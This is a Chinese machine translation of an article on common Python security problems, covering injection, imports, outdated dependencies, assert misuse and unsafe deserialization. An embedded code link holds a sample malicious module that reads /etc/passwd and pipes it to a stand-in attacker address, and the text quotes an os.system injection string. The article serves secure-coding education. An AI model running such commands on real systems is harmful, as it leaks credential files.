<html>
<head>
<title>Common Python Security Problems</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">常见的Python安全问题</h1>
<blockquote>原文：<a href="https://itnext.io/common-python-security-problems-ffedbae7b11c?source=collection_archive---------1-----------------------#2020-05-25">https://itnext.io/common-python-security-problems-ffedbae7b11c?source=collection_archive---------1-----------------------#2020-05-25</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/6724f01cf4cce0670db05ec5119bc1ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JJCzp_OrhJ4akM8I2AzcfA.jpeg"/></div></div></figure><p id="794e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Python正日益成为开发人员中最受欢迎的编程语言之一。相对较少的<a class="ae kw" href="https://www.whitesourcesoftware.com/most-secure-programming-languages/" rel="noopener ugc nofollow" target="_blank"> Python安全问题</a>和它的用户友好性使它比其他语言更有优势。出于这个原因，它为一些最大的网站提供支持，包括YouTube、Dropbox、Reddit、Quora、Spotify和Instagram。</p><p id="fc01" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">根据StackOverflow 的<a class="ae kw" href="https://insights.stackoverflow.com/survey/2019/?ref=hackernoon.com#most-popular-technologies" rel="noopener ugc nofollow" target="_blank"> 2019年调查，41.7%的开发者将Python列为他们最喜欢的开发技术。该调查还强调了Python在开发者偏好方面的排名上升，超过了C#、PHP，现在又超过了Java。</a></p><p id="69a6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然而，与任何其他技术一样，开发人员应该专注于提高应用程序的安全级别。这篇文章汇集了一些最常见的Python安全问题，并指导开发人员如何修复它们。</p><h1 id="f417" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">输入注入</h1><p id="36df" class="pw-post-body-paragraph jy jz iq ka b kb lv kd ke kf lw kh ki kj lx kl km kn ly kp kq kr lz kt ku kv ij bi translated">注入攻击可以说是任何开发环境中最常见的漏洞。在Python中，这些攻击可以采取不同的形式，包括:</p><ul class=""><li id="f3ce" class="ma mb iq ka b kb kc kf kg kj mc kn md kr me kv mf mg mh mi bi translated"><strong class="ka ir">模块注入</strong> —当恶意的Python模块或包文件被导入到目录中时，就会发生这种情况。</li><li id="b57b" class="ma mb iq ka b kb mj kf mk kj ml kn mm kr mn kv mf mg mh mi bi translated"><strong class="ka ir"> SQL注入</strong> —它涉及引入在SQL语句上下文中执行的恶意输入。</li><li id="fd0b" class="ma mb iq ka b kb mj kf mk kj ml kn mm kr mn kv mf mg mh mi bi translated"><strong class="ka ir">命令注入</strong> —在调用进程、子进程或os.system时发生。特制变量可能包含恶意值，在本地命令中调用时会引入漏洞。</li></ul><p id="c3a1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">下面是一个示例代码片段，其中导入了一个简单的恶意模块，在执行时可能会导致不良后果。</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/2386c2ad7cb3d6cc127b696831de50c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1328/format:webp/1*mBNnPIQp3e-xEnW2xTKS_g.png"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated"><a class="ae kw" href="https://carbon.now.sh/embed?bg=rgba(0%2C0%2C0%2C1)&amp;t=blackboard&amp;wt=none&amp;l=python&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=1x&amp;wm=false&amp;code=%2524%2520cat%2520malicious.py%250A%2520%2520%2520import%2520os%250A%2520%2520%2520import%2520sys%250A%2520%2520%2520os.system(%27cat%2520%252Fetc%252Fpasswd%2520%257C%2520attackers-email%2540example.com%27)%250A%2520%2520%2520del%2520sys.modules%255B%27malicious%27%255D%2520%2520%2523%2520pretend%2520it%27s%2520not%2520imported%250A%2520%2520%2520%2524%2520python%250A%2520%2520%2520%253E%253E%253E%2520import%2520malicious%250A%2520%2520%2520%253E%253E%253E%2520dir(malicious)%250A%2520%2520%2520Traceback%2520(most%2520recent%2520call%2520last)%253A%250A%2520%2520%2520NameError%253A%2520name%2520%27malicious%27%2520is%2520not%2520defined%250A" rel="noopener ugc nofollow" target="_blank"> Raw </a></figcaption></figure><p id="e910" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有几种方法可以减轻注入攻击。其中包括:</p><ul class=""><li id="a158" class="ma mb iq ka b kb kc kf kg kj mc kn md kr me kv mf mg mh mi bi translated">消毒所有输入</li><li id="7fbc" class="ma mb iq ka b kb mj kf mk kj ml kn mm kr mn kv mf mg mh mi bi translated">修正外壳中<em class="mx"> shlex </em>模块的输入转义</li><li id="0a97" class="ma mb iq ka b kb mj kf mk kj ml kn mm kr mn kv mf mg mh mi bi translated">维护对搜索路径中的包文件和目录的安全访问权限。这确保了非特权用户对文件没有写访问权。</li></ul><h1 id="78d0" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">误用导入功能</h1><p id="09a7" class="pw-post-body-paragraph jy jz iq ka b kb lv kd ke kf lw kh ki kj lx kl km kn ly kp kq kr lz kt ku kv ij bi translated">Python在导入方面非常灵活。然而，这种灵活性是以安全性为代价的。</p><p id="f7d3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当在Python 中使用<a class="ae kw" href="https://realpython.com/absolute-vs-relative-python-imports/" rel="noopener ugc nofollow" target="_blank">相对导入时，在系统路径中发现的恶意模块可能会被偷偷带入您的代码库。这很危险，因为导入语句可以在恶意模块中执行代码，从而造成安全漏洞。</a></p><p id="14b6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果像<em class="mx">_ _ import _ _(“OS”)这样简单的语句。system("uname -a") </em>包含此类恶意值，则提供的命令可用于危害应用程序中的数据或进程。</p><p id="00b6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了避免滥用导入功能，只有当传递给脚本的stdin的数据可信时，才应该使用input函数。否则，将所有数据视为原始的、不可信的输入。</p><p id="bc49" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">好在Python 3不支持隐式相对导入。相反，它将导入函数视为原始输入，从而完全修复了该漏洞。因此，Python 2用户应该考虑升级到Python 3。然而，这并不意味着Python 3用户应该对他们的导入语句漠不关心。</p><h1 id="7e54" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">使用过时的依赖关系</h1><p id="1756" class="pw-post-body-paragraph jy jz iq ka b kb lv kd ke kf lw kh ki kj lx kl km kn ly kp kq kr lz kt ku kv ij bi translated">很大一部分开发人员通过使用未打补丁的依赖关系将漏洞引入到他们的Python应用程序中。过时的Python依赖通常会打开漏洞，其中大部分会在后续版本中修复。因此，保持依赖关系的更新是至关重要的。否则，您的代码将仍然不安全。</p><p id="aca4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">例如，在这个用于解释性数学视频的<a class="ae kw" href="https://github.com/Dickson-Mwendia/Animation-engine-for-explanatory-math-videos-in-Python" rel="noopener ugc nofollow" target="_blank">基于Python的动画引擎</a>中，未打补丁的Pillow依赖项中存在大量安全漏洞，如下所示:</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi my"><img src="../Images/7ff3bc3a96d05bd5253fe8afeaca2bc3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X6eY_wuVGWOVcdno7bnJSQ.png"/></div></div></figure><p id="6013" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">依赖性中发现的三个Python漏洞是:</p><ul class=""><li id="63e6" class="ma mb iq ka b kb kc kf kg kj mc kn md kr me kv mf mg mh mi bi translated"><a class="ae kw" href="https://github.com/advisories/GHSA-5gm3-px64-rw72" rel="noopener ugc nofollow" target="_blank">CVE-2019–19911</a>—与不受控制的资源消耗相关的DoS漏洞。它影响6.2.2以下的所有枕头版本。</li><li id="9f53" class="ma mb iq ka b kb mj kf mk kj ml kn mm kr mn kv mf mg mh mi bi translated"><a class="ae kw" href="https://github.com/advisories/GHSA-hj69-c76v-86wr" rel="noopener ugc nofollow" target="_blank">CVE-2020–5313</a>—枕形缓冲区溢出，导致越界读取。此漏洞也会影响6.2.2以下的所有版本。</li><li id="1edc" class="ma mb iq ka b kb mj kf mk kj ml kn mm kr mn kv mf mg mh mi bi translated"><a class="ae kw" href="https://github.com/advisories/GHSA-j7mj-748x-7p78" rel="noopener ugc nofollow" target="_blank">CVE-2019–16865</a>—在处理特制图像文件时，枕头中的拒绝服务攻击。它影响6.2.0以下的所有版本。</li></ul><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mz"><img src="../Images/45e2ee05de99365f6c7f8c46b10a8646.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BrFD5toHa1xGe11Oj_U5iA.png"/></div></div></figure><p id="65bd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这三个漏洞可以通过将pillow依赖项更新为修补版本来修复。在这种情况下，6.2.2以上的任何版本都会修复这三个缺陷。</p><p id="3577" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">保持你的依赖关系最新的最好方法是使用<a class="ae kw" href="https://renovate.whitesourcesoftware.com/" rel="noopener ugc nofollow" target="_blank">white source renew</a>，这是一个免费的依赖关系更新工具，可以在<a class="ae kw" href="https://github.com/marketplace/renovate" rel="noopener ugc nofollow" target="_blank"> GitHub市场</a>上找到。当您将renewal集成到一个项目或工作流中时，它会扫描所有的存储库。</p><p id="c9e5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这里有一个快照显示了这个GitHub <a class="ae kw" href="https://github.com/Dickson-Mwendia/Animation-engine-for-explanatory-math-videos-in-Python" rel="noopener ugc nofollow" target="_blank"> Python项目</a>的调试级别日志。</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi na"><img src="../Images/dc18861c1db2552bed438c34d447f555.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OCH2qwVsLfVoY4VxrtWE5g.png"/></div></div></figure><p id="aebb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">扫描完代码库后，Renovate为每个过时的依赖项发起一个pull请求，如下所示:</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nb"><img src="../Images/cf3bc55974e2d4fc9041072b6f851d8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l0Xom_p9oEP9uDybLqXfxQ.png"/></div></div></figure><p id="4dd9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">一旦合并了renew调用的pull请求，易受攻击的Pillow依赖项就会更新到版本7，从而使应用程序或存储库变得安全。</p><p id="d2a0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">请注意依赖关系警报部分的绿色标记；枕头依赖中的哪些安全问题现已修复。</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nc"><img src="../Images/6f7efc67589cf3ffe7e96eadd6e235f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0sj__bPCth08iSByz-TBhg.png"/></div></div></figure><h1 id="e809" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">断言语句</h1><p id="c3fe" class="pw-post-body-paragraph jy jz iq ka b kb lv kd ke kf lw kh ki kj lx kl km kn ly kp kq kr lz kt ku kv ij bi translated">使用<em class="mx"> assert语句</em>来控制你的应用逻辑或者程序执行是错误的。它可能导致检索错误的结果，引入安全风险，甚至更糟，程序失败。</p><p id="d969" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">考虑下面的Python代码片段。</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nd"><img src="../Images/9a5277adbfe6d3dfefe2edd6a8b670bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VUiWADoBkkafVk8nwgmHmg.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated"><a class="ae kw" href="https://carbon.now.sh/embed?bg=rgba(0%2C0%2C0%2C1)&amp;t=blackboard&amp;wt=none&amp;l=python&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=1x&amp;wm=false&amp;code=def%2520get_clients(user)%253A%250A%2520%2520%2520%2520%2522%2522%2522Get%2520list%2520of%2520clients.%2522%2522%2522%250A%2520%2520%2520%2520assert%2520is_superuser(user)%252C%2520%2522User%2520is%2520not%2520a%2520member%2520of%2520superuser%2520group%2522%250A%2520%2520%2520%2520return%2520db.lookup(%27clients%27)%250A" rel="noopener ugc nofollow" target="_blank"> Raw </a></figcaption></figure><p id="1c3b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当您在<a class="ae kw" href="https://docs.python.org/3/using/cmdline.html#envvar-PYTHONOPTIMIZE" rel="noopener ugc nofollow" target="_blank">优化模式</a>下运行这个Python程序时，<em class="mx"> assertstatement </em>被忽略。因此，任何用户，包括那些不是超级用户组成员的用户，都可以成功地获得客户端列表。</p><p id="b135" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这意味着代码中的任何保护都被删除了，使得应用程序容易受到攻击。</p><p id="574a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以重写一个更安全的程序，如下所示，而不是依赖assert语句来防止代码被非法访问:</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nd"><img src="../Images/fab0f4352a16e0768167aa4ef9a9bc91.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9GHsSU7sBDs9GM4cs4HlQA.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated"><a class="ae kw" href="https://carbon.now.sh/embed?bg=rgba(0%2C0%2C0%2C1)&amp;t=blackboard&amp;wt=none&amp;l=python&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=1x&amp;wm=false&amp;code=def%2520get_clients(user)%253A%250A%2520%2520%2520%2520%2522%2522%2522Get%2520list%2520of%2520clients.%2522%2522%2522%250A%2520%2520%2520%2520if%2520not%2520is_superuser(user)%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520raise%2520PermissionError(%2522User%2520is%2520not%2520a%2520member%2520of%2520superuser%2520group%2522)%250A%2520%2520%2520%2520return%2520db.lookup(%27clients" rel="noopener ugc nofollow" target="_blank"> Raw </a></figcaption></figure><p id="91b0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="https://docs.python.org/3/reference/simple_stmts.html#the-assert-statement" rel="noopener ugc nofollow" target="_blank">断言机制</a>应该只用于与其他开发者的通信。例如，当执行单元或集成测试时。</p><h1 id="b395" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">不安全的反序列化</h1><p id="d057" class="pw-post-body-paragraph jy jz iq ka b kb lv kd ke kf lw kh ki kj lx kl km kn ly kp kq kr lz kt ku kv ij bi translated">有许多技术可以读取外部文件并将其内容加载到(反序列化)Python对象中。<a class="ae kw" href="https://docs.python.org/3/library/pickle.html" rel="noopener ugc nofollow" target="_blank"> Pickle </a>就是这样一种强大的序列化技术，它本身就有风险，尤其是当攻击者篡改序列化数据时。</p><p id="4b08" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">来自外部来源的数据从来都不安全。根据经验，永远不要将来自不可信来源的数据分解或解析到Python对象中。这是因为攻击者可以在pickling期间使用子进程模块执行任意命令。</p><p id="a359" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">此外，来自用户输入的YAML文件会使您的应用程序容易受到攻击。为了避免这种情况，使用<a class="ae kw" href="http://pyyaml.org/wiki/PyYAMLDocumentation" rel="noopener ugc nofollow" target="_blank">py YAML</a>safe _ load function(YAML . safe _ load)来处理YAML序列化。</p><p id="2c94" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">下面是一个简单的定制代码，可以用来查找代码库中所有不安全的yaml.load函数。</p><figure class="mp mq mr ms gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ne"><img src="../Images/5de2a575414ea124d2e03bb1daebc12f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9WKsHGuOMbSsXo24PZepuw.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated"><a class="ae kw" href="https://carbon.now.sh/embed?bg=rgba(0%2C0%2C0%2C1)&amp;t=blackboard&amp;wt=none&amp;l=python&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=1x&amp;wm=false&amp;code=import%2520python%250Afrom%2520CallNode%2520call%250Awhere%2520call%2520%253D%2520Value%253A%253Anamed(%2522yaml.load%2522).getACall()%250Aselect%2520call.getNode()%252C%2520%2522yaml.load%2520function%2520is%2520unsafe%2520when%2520loading%2520data%2520from%2520untrusted%2520sources.%2520Use%2520yaml.safe_load%2520instead.%2522" rel="noopener ugc nofollow" target="_blank">生</a></figcaption></figure><p id="3dc9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">总结</strong></p><p id="884c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">软件安全性应该始终处于每个Python开发项目的最前沿。虽然这篇文章旨在提高人们对安全漏洞的认识，但它并没有涵盖Python生态系统中的所有安全漏洞。</p><p id="4f55" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然而，它涵盖了在Python应用程序中引入安全漏洞的最普遍的问题。因此，遵循上面的实践，为构建安全的Python应用程序打下坚实的基础。</p></div></div>    
</body>
</html>